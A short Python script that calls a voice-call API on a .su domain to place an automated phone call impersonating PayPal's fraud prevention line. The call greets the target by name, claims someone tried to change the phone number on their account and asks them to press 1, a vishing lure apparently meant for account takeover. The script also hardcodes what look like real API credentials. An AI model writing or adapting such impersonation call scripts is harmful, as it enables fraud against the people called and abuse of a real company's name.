import requests
import json
headers = {
    'Content-Type': 'application/xml',
    'Accept': 'application/xml',

}
data = {
'max_digits' : '1',
'call_id' : callsid,
'text' : f"Hello {name}, this is an automated call from the Paypal fraud prevention line. We have sent this automated call because of an attempt to change the phone number linked to your Paypal account. If this was not you, please press 1. If this was you, you may hangup now.",
'voice' : 'Joanna'
}
response = requests.post(
    'https://api.apivalley.su/api/v1/calls/gather-say',
    headers=headers,
    json=data,  
    auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
)


print(response.text)